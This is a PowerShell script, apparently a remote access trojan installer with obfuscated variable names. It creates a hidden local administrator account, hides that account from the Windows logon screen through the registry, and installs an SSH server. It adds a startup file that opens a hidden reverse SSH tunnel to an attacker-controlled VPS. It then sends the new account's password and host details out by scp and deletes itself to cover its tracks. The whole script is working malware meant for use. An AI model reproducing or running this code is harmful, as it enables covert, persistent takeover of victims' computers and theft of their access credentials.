$OqZIMvNLyu = "USERNAME" # change me, vps username
$XUtqihmOwY = "X.X.X.X" # change me, vps ip address
$yyqBJGsNaQ = "22" # change me, default vps port [default 22]
$kfayVWglOs = "2583" # change me, routed vps port [NOT TO DEFAULT SSH PORT]

$kjmnPOEZUw = "$OqZIMvNLyu@$XUtqihmOwY"

function ZYPevXnCws {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function zKiEgcuHFn {
    [CmdletBinding()]
    param (
        [string] $KFPZlyrgvN,
        [securestring] $tZoLFfmyrU
    )    
    begin {
    }    
    process {
        New-LocalUser "$KFPZlyrgvN" -Password $tZoLFfmyrU -FullName "$KFPZlyrgvN" -Description "Temporary local admin"
        Write-Verbose "$KFPZlyrgvN local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$KFPZlyrgvN"
        Write-Verbose "$KFPZlyrgvN added to the local administrator group"
    }    
    end {
    }
}

# make admin
$KFPZlyrgvN = "luckyrat"
$WqxHmrGsaC = ZYPevXnCws
Remove-LocalUser -Name $KFPZlyrgvN
$tZoLFfmyrU = (ConvertTo-SecureString $WqxHmrGsaC -AsPlainText -Force)
zKiEgcuHFn -KFPZlyrgvN $KFPZlyrgvN -tZoLFfmyrU $tZoLFfmyrU

# registry
$GbKxhZyRqa = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$FTlMiOqsJb = '00000000'

If (-NOT (Test-Path $GbKxhZyRqa)) {
  New-ItemProperty -Path $GbKxhZyRqa -Force | Out-Null
}

New-ItemProperty -Path $GbKxhZyRqa -Name $KFPZlyrgvN -Value $FTlMiOqsJb -PropertyType DWORD -Force

# ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-Item -ItemType Directory -Path $env:USERPROFILE\.ssh
ssh-keyscan.exe -H $XUtqihmOwY >> $env:USERPROFILE\.ssh\known_hosts

# startup file
$OpVwdCgRUI = ZYPevXnCws
$XuhAjvQbPs = Get-Location
Add-Content -Path "$XuhAjvQbPs\$OpVwdCgRUI.cmd" -Value "@echo off"
Add-Content -Path "$XuhAjvQbPs\$OpVwdCgRUI.cmd" -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $kfayVWglOs`:localhost:22 $kjmnPOEZUw -i $env:temp\key`"" 

# rat file
$CDLTpxevmY = "$env:UserName.rat"
$ynHaYtsdLP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

Add-Content -Path $CDLTpxevmY -Value $ynHaYtsdLP # local ip addr
Add-Content -Path $CDLTpxevmY -Value $WqxHmrGsaC # pass
Add-Content -Path $CDLTpxevmY -Value $env:temp # temp
Add-Content -Path $CDLTpxevmY -Value $XuhAjvQbPs # startup
Add-Content -Path $CDLTpxevmY -Value $XUtqihmOwY # remote host
Add-Content -Path $CDLTpxevmY -Value $kfayVWglOs # remote port
Add-Content -Path $CDLTpxevmY -Value 'remote' # connection type

# get key and send rat
Invoke-WebRequest -Uri "http://$XUtqihmOwY/key" -OutFile "$env:temp\key"
scp -P $yyqBJGsNaQ -o StrictHostKeyChecking=no -i $env:temp\key -r $CDLTpxevmY $kjmnPOEZUw`:/home/$OqZIMvNLyu

# cleanup
Set-Location C:\Users
attrib +h +s +r luckyrat
Set-Location $XuhAjvQbPs
Remove-Item $CDLTpxevmY
Remove-Item KFPGaEYdcz.ps1
start "./$OpVwdCgRUI.cmd"
